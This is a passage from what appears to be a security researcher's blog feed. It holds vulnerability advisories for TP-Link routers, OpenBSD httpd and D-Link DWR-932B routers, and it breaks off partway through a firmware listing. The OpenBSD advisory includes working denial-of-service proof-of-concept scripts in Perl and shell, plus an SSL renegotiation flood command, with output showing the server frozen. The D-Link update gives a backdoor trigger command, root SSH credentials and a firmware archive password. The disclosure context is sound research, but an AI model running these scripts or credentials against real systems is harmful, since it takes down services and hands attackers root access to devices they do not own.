<li>Dec 27, 2016: TP-Link support is notified of the vulnerabilities (using support () tp-link.com, security () tp-link.com, lishaozhang () tp-link.net [from <code>/lib/modules/ipt_STAT.ko</code>], huangwenzhong@tp-link.net [from <code>/lib/modules/tp_domain.ko</code>]).</li>
<li>Dec 29, 2016: Pierre sends a full advisory to TP-Link security team.</li>
<li>Dec 30, 2016: TP-Link confirms the reception of the advisory.</li>
<li>Jan 03, 2017: Pierre asks TP-Link to confirm the vulnerabilities.</li>
<li>Jan 09, 2017: TP-Link confirms the security vulnerabilities in TP-Link C2 and C20i routers and security patches are in progress.</li>
<li>Jan 21, 2017: Ping from TP-Link about the "Vendor Response" section.</li>
<li>Jan 23, 2017: Pierre answers, asking details in the "Vendor Response" section.</li>
<li>Jan 24, 2017: TP-Link Korea contacts Pierre Kim about the vulnerabilities.</li>
<li>Jan 27, 2017: Pierre sends a final draft to TP-Link.</li>
<li>Feb 09, 2017: A public advisory is sent to security mailing lists.</li>
<li>Apr 25, 2017: MITRE provides CVE-2017-8217, CVE-2017-8218, CVE-2017-8219, CVE-2017-8220.</li>
</ul>
<h2>Credit</h2>
<p>These vulnerabilities were found by Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>).</p>
<h2>References</h2>
<p><a href="https://pierrekim.github.io/advisories/2017-tplink-0x00.txt">https://pierrekim.github.io/advisories/2017-tplink-0x00.txt</a></p>
<p><a href="https://pierrekim.github.io/blog/2017-02-09-tplink-c2-and-c20i-vulnerable.html">https://pierrekim.github.io/blog/2017-02-09-tplink-c2-and-c20i-vulnerable.html</a></p>
<h2>Disclaimer</h2>
<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a></p></content>
    </entry>
    
    <entry>
        <title>CVE-2017-5850 - Remote DoS against OpenBSD http server (up to 6.0)</title>
        <link href="2017-02-07-openbsd-httpd-CVE-2017-5850.html"/>
        <content type="html"><h2>Product Description</h2>
<p>The OpenBSD project produces a FREE, multi-platform 4.4BSD-based UNIX-like operating system.</p>
<h2>Vulnerabilities Summary</h2>
<p>The shipped HTTP daemon in OpenBSD (up to the latest version) is prone to 2 remote DoS.</p>
<p>The first vulnerability allows an attacker to consume all the CPU power from the remote server (CPU exhaustion).</p>
<p>The second vulnerability (Memory exhaustion) allows an attacker to consume all the RAM and the swap space on the remote side.
Processes will be killed when running out of swap space. The system will be likely to freeze.</p>
<h2>Details - CPU exhaustion (no CVE entry)</h2>
<p>OpenBSD's httpd is prone to a SSL DoS with SSL renegotiation:</p>
<pre><code>user@kali:~$ (sleep 1; while true;do echo R;done) | openssl s_client -connect 10.0.2.15:443
CONNECTED(00000003)
depth=0 C = XX, ST = secure.example.com, CN = secure.example.com
verify error:num=18:self signed certificate
verify return:1
depth=0 C = XX, ST = secure.example.com, CN = secure.example.com
verify return:1
---
Certificate chain
 0 s:/C=XX/ST=secure.example.com/CN=secure.example.com
   i:/C=XX/ST=secure.example.com/CN=secure.example.com
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIDCjCCAfICCQC0tQxJqUqQTzANBgkqhkiG9w0BAQsFADBHMQswCQYDVQQGEwJY
WDEbMBkGA1UECAwSc2VjdXJlLmV4YW1wbGUuY29tMRswGQYDVQQDDBJzZWN1cmUu
ZXhhbXBsZS5jb20wHhcNMTcwMTI3MTU0MjMzWhcNMTgwMTI3MTU0MjMzWjBHMQsw
CQYDVQQGEwJYWDEbMBkGA1UECAwSc2VjdXJlLmV4YW1wbGUuY29tMRswGQYDVQQD
DBJzZWN1cmUuZXhhbXBsZS5jb20wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
AoIBAQCjIY7mMaNVLmPDA4ir59mgdQEM4TFTgz5cv9SqU4hQq0eVmpJkEfJPHErF
to5NdF2ZIqhL+F34GqZcCC8qO3xB33dAevENWWbA4KObpIybHr8bFeDYYl5GuaCO
hizmcffU3P1ztRNXB4sCTTQwkyry8ZUDaeINLGMb0HhFR9u5TJY6tSB0KMIuiBsH
1hEp8bNxUM046D0wkZkyIgM/or6uj5jRj33aYUn6ZiU8a6UKSAVZJLqziyNcQ0hA
64gS6oapUnMVYJIUDJynOhY5e8xZmD+2pB4NLTIxAEdSyQ4wQ4jBiRFVL+E68fuw
kASmrA4gAbSCO+lYBO8wCRiVOwOdAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAC1L
213ziHqFmC8nLWvvjyoHY2PRFS1ofrfciv+fpohn2GN+eVb8DGTo+KLZ910/PUPk
dzTa7eOlkvR1OG7BUlnia6pGQqizTodvzx0DGgl76k4VpEvJAOZ4f7Plry4qgr5Y
y3Fwym1k3DlNJ5Jqh8Vp2HETbqcovATsUHRS5t/oc6N2egq1DYVC5CdGRgvmmUl+
NBjKOASYoP8S4OQ51wMmXrygFqKcEkq4/GTUFEaamrbM/J+ChD9EqejSKzZ5owRh
74v10s30OylBdmfOLeyrMv5s6DnJRAdtFEH9Wg7sQDt1P3bGOsObVZlmHCtArl4k
m1nHRn8scAFP7QbHl34=
-----END CERTIFICATE-----
subject=/C=XX/ST=secure.example.com/CN=secure.example.com
issuer=/C=XX/ST=secure.example.com/CN=secure.example.com
---
No client certificate CA names sent
---
SSL handshake has read 1548 bytes and written 503 bytes
---
New, TLSv1/SSLv3, Cipher is ECDHE-RSA-AES256-GCM-SHA384
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
SSL-Session:
    Protocol  : TLSv1.2
    Cipher    : ECDHE-RSA-AES256-GCM-SHA384
    Session-ID: DA628A16EF4F067ED81E7A26EFA18D9A7D53CBC4ED54C8F6DC11E5E60FF76530
    Session-ID-ctx: 
    Master-Key: 9235AFEBCF2A517E896A06CAA7A1AF916646DB5BB4C99B53A79627351C0FFB936EB863B0E50A67DF70A354773CF049BE
    Key-Arg   : None
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 300 (seconds)
    TLS session ticket:
    0000 - 49 f1 29 da 9e 08 f2 74-c6 f3 eb a1 c7 ee 40 bb   I.)....t......@.
    0010 - 96 75 54 c8 4f 32 53 7e-51 40 4e a8 e9 57 41 a5   .uT.O2S~Q@N..WA.
    0020 - 73 3d a9 d6 b8 f7 a0 f8-15 cb be fb f1 4d d9 81   s=...........M..
    0030 - a8 79 56 11 5d 05 32 05-49 df 2b f3 71 89 36 a1   .yV.].2.I.+.q.6.
    0040 - 93 dc b9 b5 00 48 6f 94-b1 c5 78 f8 38 3c 63 29   .....Ho...x.8&lt;c)
    0050 - ed 45 a2 9e ae fc 7e d7-12 76 34 15 93 b1 3d 3d   .E....~..v4...==
    0060 - d7 0a 14 f1 01 a7 87 6c-50 93 25 24 5e 4f 1b fa   .......lP.%$^O..
    0070 - 51 03 4b fa 7e 23 83 99-51 f6 47 10 8c d1 0e 41   Q.K.~#..Q.G....A
    0080 - 5a f7 a5 10 33 a7 37 5d-9b 5e b0 b6 19 e7 e2 61   Z...3.7].^.....a
    0090 - ec ea 1c 72 3c 4a ec 11-0f 26 35 76 6e d9 cb 4d   ...r&lt;J...&amp;5vn..M
    00a0 - c7 f8 57 cb 50 f6 47 02-6b ca be cc 29 04 b7 dc   ..W.P.G.k...)...
    00b0 - e0 d1 cc 8e 5b f9 05 06-10 72 d7 b6 8e cf 42 6a   ....[....r....Bj

    Start Time: 1485536662
    Timeout   : 300 (sec)
    Verify return code: 18 (self signed certificate)
---
RENEGOTIATING
depth=0 C = XX, ST = secure.example.com, CN = secure.example.com
verify error:num=18:self signed certificate
verify return:1
depth=0 C = XX, ST = secure.example.com, CN = secure.example.com
verify return:1
RENEGOTIATING
depth=0 C = XX, ST = secure.example.com, CN = secure.example.com
verify error:num=18:self signed certificate
verify return:1
depth=0 C = XX, ST = secure.example.com, CN = secure.example.com
verify return:1
RENEGOTIATING
depth=0 C = XX, ST = secure.example.com, CN = secure.example.com
verify error:num=18:self signed certificate
verify return:1
depth=0 C = XX, ST = secure.example.com, CN = secure.example.com
verify return:1
RENEGOTIATING
[...]
</code></pre>
<p>From my test, 1 renegociation thread takes =~ 70% of CPU.</p>
<p>top on the main server (10.0.2.15):</p>
<pre><code>14711 www       51    0 1104K 3636K run       -         1:07 69.55% httpd
</code></pre>
<p>Multiple threads will eat all the available CPUs and will be likely to DoS the httpd:</p>
<pre><code>14711 www       63    0 1192K 3708K run       -         2:48 33.45% httpd
77207 www       63    0 1284K 3788K run       -         1:33 33.06% httpd
78835 www       62    0 1232K 3808K run       -         0:15 28.08% httpd
</code></pre>
<p>There is no trace of such attacks in the httpd logs.</p>
<p>An attacker can use tools from THC to perform SSL DoS too (openssl was the fastest solution out of the box): <a href="https://www.thc.org/thc-ssl-dos/">https://www.thc.org/thc-ssl-dos/</a>.</p>
<h2>Details - Memory exhaustion (CVE-2017-5850)</h2>
<p>A vulnerability exists in the openbsd HTTP daemon. It will result in using all the RAM and the swap space on the remote side, processes will be killed when running out of swap space. The system will be likely to freeze.</p>
<p>Requesting file using a file-range will result in having a httpd process doing a full malloc() of the requested file.
It appears the entry is not correctly free()'d.</p>
<p>Hence, it's possible to DoS the remote server by requesting a file over and over by specifying a custom file range, ie:</p>
<pre><code>GET /index.html HTTP/1.1
Range: bytes=1-
User-Agent: Pierre loves you
Host: fill-me-with-joy
</code></pre>
<p>This attack is successful if an attacker can identify a 'big' file (i.e. &gt; 10MB) served by the remote HTTP server.</p>
<p>Here is a provided PoC (loosely based on KingCope's apache_killer.pl):</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #408080; font-style: italic">#!/usr/bin/perl -w</span>

<span style="color: #008000; font-weight: bold">use</span> <span style="color: #0000FF; font-weight: bold">warnings</span>;
<span style="color: #008000; font-weight: bold">use</span> <span style="color: #0000FF; font-weight: bold">IO::Socket</span>;
<span style="color: #008000; font-weight: bold">use</span> <span style="color: #0000FF; font-weight: bold">Parallel::ForkManager</span>;

<span style="color: #19177C">$numforks</span> <span style="color: #666666">=</span> <span style="color: #666666">50</span>;

<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #19177C">$#ARGV</span> <span style="color: #666666">&lt;</span> <span style="color: #666666">1</span>)
{
  <span style="color: #666666">&amp;</span>usage;
  <span style="color: #008000">exit</span>;
}

<span style="color: #008000; font-weight: bold">while</span> (<span style="color: #666666">1</span>) {
  <span style="color: #666666">&amp;</span>killhttpd();
}

<span style="color: #008000; font-weight: bold">sub</span> <span style="color: #0000FF">usage</span> {
  <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;OpenBSD HTTP Remote Denial of Service (memory exhaustion) - @PierreKimSec\n&quot;</span>;
  <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;usage: perl killobsdhttpd.pl &lt;host&gt; &lt;remotefile&gt;\n&quot;</span>;
}

<span style="color: #008000; font-weight: bold">sub</span> <span style="color: #0000FF">killhttpd</span> {
  <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;ATTACKING $ARGV[0] [using $numforks forks]\n&quot;</span>;

  <span style="color: #19177C">$pm</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">new</span> <span style="color: #0000FF; font-weight: bold">Parallel::</span>ForkManager(<span style="color: #19177C">$numforks</span>);

  <span style="color: #008000; font-weight: bold">for</span> (<span style="color: #666666">0</span> <span style="color: #666666">..</span> <span style="color: #19177C">$numforks</span>)
  {
    <span style="color: #008000; font-weight: bold">my</span> <span style="color: #19177C">$pid</span> <span style="color: #666666">=</span> <span style="color: #19177C">$pm</span><span style="color: #666666">-&gt;</span>start <span style="color: #AA22FF; font-weight: bold">and</span> <span style="color: #008000; font-weight: bold">next</span>;
    <span style="color: #008000; font-weight: bold">my</span> <span style="color: #19177C">$sock</span> <span style="color: #666666">=</span> <span style="color: #0000FF; font-weight: bold">IO::Socket::INET</span><span style="color: #666666">-&gt;</span><span style="color: #008000; font-weight: bold">new</span>(PeerAddr <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$ARGV</span>[<span style="color: #666666">0</span>],
                                     PeerPort <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&quot;80&quot;</span>,
                                     Proto    <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;tcp&#39;</span>);
    <span style="color: #19177C">$p</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;GET $ARGV[1] HTTP/1.1\r\nRange: bytes=1-\r\nAccept: */*\r\nHost: $ARGV[0]\r\nConnection: close\r\n\r\n&quot;</span>;
    <span style="color: #008000; font-weight: bold">print</span> <span style="color: #19177C">$sock</span> <span style="color: #19177C">$p</span>;
    <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #BB6688">&lt;$sock&gt;</span>) {<span style="color: #008000">sleep</span> (<span style="color: #666666">0.5</span>); <span style="color: #19177C">$sock</span><span style="color: #666666">-&gt;</span><span style="color: #008000">close</span>();}
    <span style="color: #19177C">$pm</span><span style="color: #666666">-&gt;</span>finish;
  }
  <span style="color: #19177C">$pm</span><span style="color: #666666">-&gt;</span>wait_all_children;
}
</pre></div>

<p>An attacker can use curl to replicate the PoC:</p>
<pre><code>curl --limit-rate 1 --continue-at 1 --header "Host: www.example.com" http://target/10mb.fs
</code></pre>
<p>Stopping the curl process and launching it again will produce one of the remote httpd to use more than 10MB of memory
for each request (the size of the 10mb.fs is 10MB) and will DoS the http server and the OpenBSD system by exhausting
all the RAM. The OpenBSD system will likely freeze within minutes.</p>
<p>PoC with curl (more effective than the perl version, it appears):</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #408080; font-style: italic">#!/bin/sh</span>
<span style="color: #408080; font-style: italic"># ./$0 www.target.tld /path/to/file</span>

<span style="color: #008000">unset</span> http_proxy
<span style="color: #008000">unset</span> https_proxy

<span style="color: #008000; font-weight: bold">for</span> i in <span style="color: #008000; font-weight: bold">$(</span>seq <span style="color: #666666">0</span> <span style="color: #666666">300</span><span style="color: #008000; font-weight: bold">)</span>
<span style="color: #008000; font-weight: bold">do</span>
  <span style="color: #008000">echo</span> sending a req
  curl --limit-rate <span style="color: #666666">1</span> --continue-at <span style="color: #666666">1</span> --header <span style="color: #BA2121">&quot;Host: </span><span style="color: #19177C">$1</span><span style="color: #BA2121">&quot;</span> http://<span style="color: #19177C">$1</span>/<span style="color: #19177C">$2</span> <span style="color: #666666">2</span>&gt;/dev/null &gt;/dev/null &amp;
  sleep <span style="color: #666666">0</span>.5
  pkill curl
<span style="color: #008000; font-weight: bold">done</span>
<span style="color: #008000; font-weight: bold">while</span> sleep <span style="color: #666666">1</span>
<span style="color: #008000; font-weight: bold">do</span>
  <span style="color: #008000">echo</span> <span style="color: #BA2121">&quot;sending a req (slow)&quot;</span>
  curl --limit-rate <span style="color: #666666">1</span> --continue-at <span style="color: #666666">1</span> --header <span style="color: #BA2121">&quot;Host: </span><span style="color: #19177C">$1</span><span style="color: #BA2121">&quot;</span> http://<span style="color: #19177C">$1</span>/<span style="color: #19177C">$2</span> <span style="color: #666666">2</span>&gt;/dev/null &gt;/dev/null &amp;
  pkill curl
<span style="color: #008000; font-weight: bold">done</span>
</pre></div>

<p>This attack works using HTTP and using HTTPS.</p>
<p>Current situation in the attacked server (SWAP is full and all the RAM is being completely used):</p>
<pre><code>load averages:  7.11,  3.30,  1.38                                             foo.my.domain 10:26:41
39 processes: 6 running, 32 idle, 1 on processor                                             up  0:03
CPU states:  0.0% user,  0.0% nice,  100% system,  0.0% interrupt,  0.0% idle
Memory: Real: 569M/961M act/tot Free: 21M Cache: 49M Swap: 2039M/2040M

  PID USERNAME PRI NICE  SIZE   RES STATE     WAIT      TIME    CPU COMMAND
  48965 www       28    0 1345M  204M run       -         0:05  0.00% httpd
  43060 www       28    0 1281M  174M run       -         0:05  0.00% httpd
  91565 www       28    0 1153M  187M run       -         0:04  0.00% httpd
  63038 www        2    0  948K    4K idle      kqread    0:00  0.00% httpd
</code></pre>
<p>We see the daemons (httpd and sshd) don't answer anymore:</p>
<pre><code>user@kali:~$ 10.0.2.15 80
Trying 10.0.2.15...
Connected to 10.0.2.15.
Escape character is '^]'.

^]
telnet&gt; q
Connection closed.
user@kali:~$ telnet 10.0.2.15 80
Trying 10.0.2.15...
Connected to 10.0.2.15.
Escape character is '^]'.

^]
telnet&gt; q
Connection closed.
user@kali:~$ telnet 10.0.2.15 22
Trying 10.0.2.15...
Connected to 10.0.2.15.
Escape character is '^]'.

^]
telnet&gt; q
Connection closed.
Connection closed by foreign host.
</code></pre>
<h2>Vendor Response</h2>
<p>o The issue about memory exhaustion has been solved in two ways:</p>
<ul>
<li>OpenBSD 6.0/5.9: Erratas has been issued at:</li>
</ul>
<p><a href="https://ftp.openbsd.org/pub/OpenBSD/patches/6.0/common/017_httpd.patch.sig">https://ftp.openbsd.org/pub/OpenBSD/patches/6.0/common/017_httpd.patch.sig</a></p>
<p><a href="https://ftp.openbsd.org/pub/OpenBSD/patches/5.9/common/034_httpd.patch.sig">https://ftp.openbsd.org/pub/OpenBSD/patches/5.9/common/034_httpd.patch.sig</a></p>
<ul>
<li>OpenBSD -current: We reimplemented support for byte ranges in
-current.  The previous implementation was flawed indeed, as it tried
to load the complete ranges into memory at once.</li>
</ul>
<p>o High CPU usage is a well-known issue of client-initiated
renegotiation.  While this can cause higher than normal CPU usage, the
processes are still able to service requests.</p>
<p>As httpd uses LibreSSL's libtls, a sane TLS API on top of libssl, we
decided to disable client-initiated renegotiation for libtls servers
in -current.  This change was already planned and has now been
committed to LibreSSL.</p>
<ul>
<li>libssl <a href="http://marc.info/?l=openbsd-cvs&amp;m=148587695222112&amp;w=2">http://marc.info/?l=openbsd-cvs&amp;m=148587695222112&amp;w=2</a></li>
<li>libtls <a href="http://marc.info/?l=openbsd-cvs&amp;m=148587827322528&amp;w=2">http://marc.info/?l=openbsd-cvs&amp;m=148587827322528&amp;w=2</a></li>
</ul>
<h2>Report Timeline</h2>
<ul>
<li>Jan 25, 2017: Vulnerabilities found by Pierre Kim.</li>
<li>Jan 30, 2017: OpenBSD team is notified of the vulnerabilities.</li>
<li>Jan 30, 2017: OpenBSD team replies that they will study the advisory.</li>
<li>Jan 31, 2017: OpenBSD team confirms the vulnerabilities.</li>
<li>Jan 31, 2017: Pierre Kim asks for CVE entries.</li>
<li>Jan 31, 2017: OpenBSD team releases security patches.</li>
<li>Feb 01, 2017: cve-assign () mitre org assigns CVE-2017-5850 and asks for more details.</li>
<li>Feb 07, 2017: A public advisory is sent to security mailing lists.</li>
</ul>
<h2>Credit</h2>
<p>These vulnerabilities were found by Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>).</p>
<h2>References</h2>
<p><a href="https://pierrekim.github.io/blog/2017-02-07-openbsd-httpd-CVE-2017-5850.html">https://pierrekim.github.io/blog/2017-02-07-openbsd-httpd-CVE-2017-5850.html</a></p>
<p><a href="https://pierrekim.github.io/advisories/CVE-2017-5850-openbsd.txt">https://pierrekim.github.io/advisories/CVE-2017-5850-openbsd.txt</a></p>
<p><a href="https://ftp.openbsd.org/pub/OpenBSD/patches/6.0/common/017_httpd.patch.sig">https://ftp.openbsd.org/pub/OpenBSD/patches/6.0/common/017_httpd.patch.sig</a></p>
<p><a href="https://ftp.openbsd.org/pub/OpenBSD/patches/5.9/common/034_httpd.patch.sig">https://ftp.openbsd.org/pub/OpenBSD/patches/5.9/common/034_httpd.patch.sig</a></p>
<h2>Disclaimer</h2>
<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a></p></content>
    </entry>
    
    <entry>
        <title>Update - Multiple vulnerabilities found in the Dlink DWR-932B (backdoor, backdoor accounts, weak WPS, RCE ...) - Analysis of the corrected firmware</title>
        <link href="2017-02-02-update-dlink-dwr-932b-lte-routers-vulnerabilities.html"/>
        <content type="html"><p>An update on the post "<a href="https://pierrekim.github.io/blog/2016-09-28-dlink-dwr-932b-lte-routers-vulnerabilities.html">Multiple vulnerabilities found in the Dlink DWR-932B (backdoor, backdoor accounts, weak WPS, RCE ...)</a>":</p>
<p>MITRE has provided me with CVE numbers.</p>
<ul>
<li>CVE-2016-10177 for #1 (Backdoor accounts)</li>
<li>CVE-2016-10178 for #2 (Backdoor)</li>
<li>CVE-2016-10179 for #3 (hardcoded WPS PIN)</li>
<li>CVE-2016-10180 for #4 (WPS PIN generation based on srand(time(0)) seeding)</li>
<li>CVE-2016-10181 for #5 (qmiweb leaks information)</li>
<li>CVE-2016-10182 for #6 (qmiweb allows command injection with ` characters)</li>
<li>CVE-2016-10183 for #7 (qmiweb allows directory listing with ../ traversal)</li>
<li>CVE-2016-10184 for #8 (qmiweb allows file reading with ..%2f traversal)</li>
<li>CVE-2016-10185 for #9 (A secure_mode=no line exists in /var/miniupnpd.conf)</li>
<li>CVE-2016-10186 for #10 (/var/miniupnpd.conf has no deny rules)</li>
</ul>
<p>Although <a href="http://www.dlink.com/xk/sq/support/support-news/2016/october/19/multiple-potential-vulnerabilities-found-in-the-dwr_932-hw-b1">D-link did not acknowledge all the vulnerabilities on its products</a>,
<strong>it released a new firmware</strong> on Oct 19, 2016 (<a href="ftp://anonymous:lolz@ftp.dlink.eu/Products/dwr/dwr-932/driver_software/DWR-932_fw_revB_2_03_eu_en_20161011.zip">DWR-932_fw_revB_2_03_eu_en_20161011.zip</a>)
that <strong>should fix several RCEs and backdoors</strong>.
<strong>According to D-Link, there is no vulnerability as long as
"potential attackers cannot connect to the secure wi-fi network"[1]
- does it mean the product is secure as long as there are no attackers?</strong></p>
<p>A reader will note that D-Link did have a full advisory with PoCs <strong><a href="https://pierrekim.github.io/blog/2016-09-28-dlink-dwr-932b-lte-routers-vulnerabilities.html">for more than 100 days while taking no actions before public disclosure</a></strong> and he/she will surely be able to verify the vulnerabilities by downloading an affected firmware and reversing the binaries (<a href="https://pierrekim.github.io/blog/2016-09-28-dlink-dwr-932b-lte-routers-vulnerabilities.html">see my blog post for details</a>).</p>
<p>D-Link did not make any effort to contact the security researcher even after the initial advisory was published, but it posted its official answers and patches on their website that the security researcher found "by chance".</p>
<p>However, <strong>the corrected firmware still appears to have the backdoor in execution</strong>. The only security patches they made were:</p>
<ol>
<li>renaming <code>/sbin/telnetd</code> to <code>/sbin/xxlnetd</code> (so the <code>appmgr</code> backdoor cannot be used by an attacker),</li>
<li>dropbear is now listening to port <code>47980/tcp</code> or to port <code>999999999/tcp</code> instead of <code>22/tcp</code> (still with <code>root/1234</code>).</li>
</ol>
<p>The <code>appmgr</code> backdoor is still present and running but ineffective (as <code>/sbin/telnetd</code> doesn't exist anymore):</p>
<pre><code>root@kali:~$ echo -ne "HELODBG" | nc -u 192.168.1.1 39889 &lt;- will NOT start a telnetd on port 23/tcp
                                                             because /sbin/telnetd was removed
</code></pre>
<p><strong>Interesting fact:</strong> Starting Dropbear with port <code>999999999/tcp</code> will result in dropbear using the port <code>51711/tcp</code> instead (<code>999999999 &amp; 0xFFFF</code>).</p>
<p>So, an attacker can still use the backdoor access to continue to root the device. With SSH:</p>
<pre><code>root@kali:~$ ssh -l root -p 47980 192.168.1.1 &lt;- will provide a root shell with "1234" as a password.
</code></pre>
<p>OR</p>
<pre><code>root@kali:~$ ssh -l root -p 51711 192.168.1.1 &lt;- will provide a root shell with "1234" as a password.
</code></pre>
<p><strong>Following the reaction from D-Link and the lack of quality of the security patches,
I finally advise users to trash their affected routers and
I encourage security researchers to review security patches provided from D-Link instead of blindly trusting them.</strong></p>
<p>Note that future 0day vulnerabilities regarding D-Link products may be released at my will without coordinated disclosure ("Full disclosure").</p>
<h2>"ALTERNATIVE FACT" - backdoor access are still present inside the new firmware:</h2>
<p>I would like to thank <a href="https://www.linkedin.com/pulse/rooting-dlink-dwr-923-4g-router-gianni-carabelli">Gianni Carabelli</a> for finding the password of the zip file provided by D-Link.</p>
<pre><code>root@kali:~# wget ftp://anonymous:lolz@ftp.dlink.eu/Products/dwr/dwr-932/driver_software/DWR-932_fw_revB_2_03_eu_en_20161011.zip
root@kali:~# sha256sum DWR-932_fw_revB_2_03_eu_en_20161011.zip # in case of a modification of this file by D-link
fb721979b235c9da9a9b8e505767ce04410b8c7f5035a73ac2c4cc0b9cada3bd DWR-932_fw_revB_2_03_eu_en_20161011.zip
root@kali:~# dd if=DWR-932_fw_revB_2_03_eu_en_20161011.zip of=firmware.zip bs=64 skip=1
993106+1 records in
993106+1 records out
63558829 bytes (64 MB) copied, 1.29239 s, 49.2 MB/s
root@kali:~# mkdir output &amp;&amp; cd output &amp;&amp; 7z x -pbeUT9Z ../firmware.zip
root@kali:~/output# 7z x -pbeUT9Z firmware.zip

7-Zip 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,1 CPU)

Processing archive: ../firmware.zip

Extracting  02.03EU
Extracting  2K-cksum.txt
Extracting  2K-mdm-image-mdm9625.yaffs2
Extracting  appsboot.mbn
Extracting  mba.mbn
Extracting  mdm-image-boot-mdm9625.img
Extracting  mdm-image-mdm9625.yaffs2
Extracting  mdm-recovery-image-boot-mdm9625.img
Extracting  mdm-recovery-image-mdm9625.yaffs2
Extracting  mdm9625-usr-image.usrfs.yaffs2
Extracting  qdsp6sw.mbn
Extracting  rpm.mbn
Extracting  sbl1.mbn
Extracting  tz.mbn
Extracting  wdt.mbn

Everything is Ok

Files: 15
Size:       145018347
Compressed: 63558829
root@kali:~/output# ls -latr
total 141640
-rwx------ 1 root root     7840 Jul 18  2014 wdt.mbn
-rwx------ 1 root root   266648 Jul 18  2014 tz.mbn
-rwx------ 1 root root   262144 Jul 18  2014 sbl1.mbn
-rwx------ 1 root root   147432 Jul 18  2014 rpm.mbn
-rwx------ 1 root root 42338681 Jul 18  2014 qdsp6sw.mbn
-rw------- 1 root root  3823616 Jul 18  2014 mdm-recovery-image-boot-mdm9625.img
-rw------- 1 root root  3823616 Jul 18  2014 mdm-image-boot-mdm9625.img
-rwx------ 1 root root   365464 Jul 18  2014 mba.mbn
-rwx------ 1 root root    69872 Jul 18  2014 appsboot.mbn
-rw------- 1 root root 14733312 Oct 10 23:16 mdm-recovery-image-mdm9625.yaffs2
-rw------- 1 root root 25869888 Oct 10 23:16 mdm-image-mdm9625.yaffs2
-rw------- 1 root root 25869888 Oct 11 02:37 2K-mdm-image-mdm9625.yaffs2
-rw------- 1 root root 27439104 Oct 11 03:19 mdm9625-usr-image.usrfs.yaffs2
-rw------- 1 root root      842 Oct 11 03:19 2K-cksum.txt
-rw------- 1 root root        0 Oct 11 03:19 02.03EU
drwx------ 2 root root      340 Nov 10 17:07 .
drwx------ 3 root root       80 Nov 10 17:24 ..
root@kali:~/output# mkdir 1 &amp;&amp; cd 1 &amp;&amp; unyaffs ../mdm9625-usr-image.usrfs.yaffs2
</code></pre>
<p>Only <code>etc/versions</code> was updated in <code>mdm9625-usr-image.usrfs.yaffs2</code>. No useful information.</p>
<p>Diff is:</p>
<pre><code>1c1
&lt; fw_version=02.02EU
---
&gt; fw_version=02.03EU
7c7
&lt; model_name=beUT9Z
---
&gt; model_name=beUT9Z#
</code></pre>
<p><code>mdm-recovery-image-mdm9625.yaffs2</code> was unchanged compared to 2.02 version.</p>
<p>Let's dig <code>2K-mdm-image-mdm9625.yaffs2</code>:</p>
<pre><code>root@kali:~/output/1# cd .. &amp;&amp; mkdir 2 &amp;&amp; cd 2 &amp;&amp; unyaffs ../2K-mdm-image-mdm9625.yaffs2
root@kali:~/output/2# ls -latr
total 4
drwxr-xr-x  2 root root   40 Jul 18  2014 sys
drwxr-xr-x  2 root root   40 Jul 18  2014 proc
drwxr-xr-x  2 root root 1300 Jul 18  2014 dev
drwxr-xr-x  2 root root   40 Jul 18  2014 boot
drwxr-xr-x  7 root root  240 Jul 18  2014 var
lrwxrwxrwx  1 root root    8 Jul 18  2014 www -&gt; /usr/www
lrwxrwxrwx  1 root root   11 Jul 18  2014 sdcard -&gt; /media/card
drwxr-xr-x  2 root root  120 Jul 18  2014 mnt
drwxr-xr-x 10 root root  200 Jul 18  2014 media
drwxr-sr-x  3 root root   60 Jul 18  2014 home
drwxr-xr-x  2 root root   60 Jul 18  2014 disk
drwxr-xr-x  3 root root   60 Jul 18  2014 WEBSERVER
lrwxrwxrwx  1 root root   12 Jul 18  2014 linuxrc -&gt; /bin/busybox
drwxr-xr-x  2 root root 6020 Jul 18  2014 bin
drwxr-xr-x  2 root root   40 Jul 18  2014 usr
drwxrwxrwt  2 root root   40 Jul 18  2014 tmp
drwxr-xr-x  4 root root 1140 Jul 18  2014 lib
drwxr-xr-x 31 root root 1680 Jul 18  2014 etc
drwxr-xr-x  2 root root   40 Jul 18  2014 config2
drwxr-xr-x  2 root root   40 Jul 18  2014 config
drwxr-xr-x  2 root root   40 Jul 18  2014 cache
-rw-r--r--  1 root root   38 Jul 18  2014 build.prop
drwxr-xr-x 21 root root  500 Jul 18  2014 .
drwxr-xr-x  2 root root 3040 Oct 10 23:12 sbin
drwx------  4 root root  380 Nov 10 17:26 ..
root@kali:~/output/2# ls -latr etc/init.d|tail
-rwxr-xr-x  1 root root  2015 Jul 18  2014 reboot
-rwxr-xr-x  1 root root 10835 Jul 18  2014 power_config
-rwxr-xr-x  1 root root  2138 Jul 18  2014 start_ipacm_le
-rwxr-xr-x  1 root root   609 Jul 18  2014 run-postinsts
-rwxr-xr-x  1 root root  2178 Jul 18  2014 start_appmgr
